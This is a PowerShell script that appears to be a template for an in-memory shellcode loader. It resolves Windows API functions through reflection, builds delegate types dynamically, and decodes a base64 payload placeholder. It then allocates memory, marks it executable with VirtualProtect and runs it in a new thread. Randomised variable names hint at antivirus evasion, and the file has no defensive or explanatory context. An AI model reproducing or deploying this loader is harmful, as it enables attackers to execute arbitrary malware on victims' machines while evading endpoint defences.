function getProcAddress {

        Param ($dllName, $functionName)
        $getAssemblies = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $getAssemblies.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef],[String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($getAssemblies.GetMethod('GetModuleHandle')).Invoke($null, @($dllName)))), $functionName))
}

function dzk {
        Param 
        (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $xmHDW,
                [Parameter(Position = 1)] [Type] $rmTp0 = [Void]
        )

        $defineDynamicAssembly = [AppDomain]::CurrentDomain.DefineDynamicAssembly( (New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        
        $defineDynamicAssembly.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $xmHDW).SetImplementationFlags('Runtime, Managed')
        
        $defineDynamicAssembly.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $rmTp0, $xmHDW).SetImplementationFlags('Runtime, Managed')

        return $defineDynamicAssembly.CreateType()
}

# shellcode
[Byte[]]$shellcode = [System.Convert]::FromBase64String("SHELL_CODE_B64")

# VirtualAlloc
$pMemForExec = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((getProcAddress kernel32.dll VirtualAlloc), (dzk @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $shellcode.Length, 0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $pMemForExec, $shellcode.length)

# VirtualProtect for execution
[Uint32]$uJC = 0
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((getProcAddress kernel32.dll VirtualProtect), (dzk @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($pMemForExec, [Uint32]$shellcode.Length, 0x10, [Ref]$uJC)) -eq $true) 
{
        # CreateThread
        $u7UUR = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((getProcAddress kernel32.dll CreateThread), (dzk @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$pMemForExec,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((getProcAddress kernel32.dll WaitForSingleObject), (dzk @([IntPtr], [Int32]))).Invoke($u7UUR,0xffffffff) | Out-Null
}
